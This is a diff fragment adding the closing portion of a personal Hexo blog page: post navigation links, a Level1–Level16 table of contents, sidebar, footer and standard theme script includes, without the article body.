+    <a href="/180404HuaweiExam/" rel="prev" title="华为2018年校园招聘软件题">
+      <i class="fa fa-chevron-left"></i> 华为2018年校园招聘软件题
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/180406BugkuWriteup/" rel="next" title="Bugku Writeup">
+      Bugku Writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Level1"><span class="nav-number">1.</span> <span class="nav-text">Level1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level2"><span class="nav-number">2.</span> <span class="nav-text">Level2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level3"><span class="nav-number">3.</span> <span class="nav-text">Level3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level4"><span class="nav-number">4.</span> <span class="nav-text">Level4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level5"><span class="nav-number">5.</span> <span class="nav-text">Level5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level6"><span class="nav-number">6.</span> <span class="nav-text">Level6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level7"><span class="nav-number">7.</span> <span class="nav-text">Level7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level8"><span class="nav-number">8.</span> <span class="nav-text">Level8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level9"><span class="nav-number">9.</span> <span class="nav-text">Level9</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level10"><span class="nav-number">10.</span> <span class="nav-text">Level10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level11"><span class="nav-number">11.</span> <span class="nav-text">Level11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level12"><span class="nav-number">12.</span> <span class="nav-text">Level12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level13"><span class="nav-number">13.</span> <span class="nav-text">Level13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level16"><span class="nav-number">14.</span> <span class="nav-text">Level16</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="findneo"
+      src="/images/findneo.png">
+  <p class="site-author-name" itemprop="name">findneo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/findneo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;findneo" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/findneo_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;findneo_" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
